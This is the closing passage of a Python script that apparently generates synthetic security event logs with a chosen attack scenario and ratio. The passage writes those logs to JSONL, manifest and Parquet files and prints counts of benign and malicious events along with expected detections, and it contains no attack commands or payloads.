                        metavar="SCENARIO", help=f"Attack scenario: {', '.join(_ATTACK_SCENARIOS)}")
    parser.add_argument("--output", default="./generated", help="Output directory")
    parser.add_argument("--seed", type=int, default=42, help="Random seed for reproducibility")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    print(f"Generating {args.events} events for {args.table} (scenario: {args.scenario})...")
    events, manifest = generate(
        table=args.table,
        total_events=args.events,
        attack_ratio=args.attack_ratio,
        scenario=args.scenario,
        seed=args.seed,
    )

    ts_str = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    jsonl_path = output_dir / f"{args.table}_{ts_str}.jsonl"
    manifest_path = output_dir / f"manifest_{ts_str}.json"

    with jsonl_path.open("w") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    with manifest_path.open("w") as f:
        json.dump(manifest, f, indent=2, default=str)

    # Write Parquet
    try:
        import pandas as pd
        import pyarrow as pa
        import pyarrow.parquet as pq

        parquet_path = output_dir / f"{args.table}_{ts_str}.parquet"
        df = pd.DataFrame(events)
        pq.write_table(pa.Table.from_pandas(df, preserve_index=False), str(parquet_path))
        print(f"Parquet: {parquet_path}")
    except ImportError:
        print("pyarrow not available — skipping Parquet output")

    print(f"JSONL:    {jsonl_path}")
    print(f"Manifest: {manifest_path}")
    print(f"Benign events:    {args.events - manifest['malicious_events']}")
    print(f"Malicious events: {manifest['malicious_events']}")
    if manifest["mitre_techniques"]:
        print(f"MITRE techniques: {', '.join(manifest['mitre_techniques'])}")
    if manifest["expected_detections"]:
        print(f"Expected alerts:  {', '.join(manifest['expected_detections'])}")


if __name__ == "__main__":
    main()
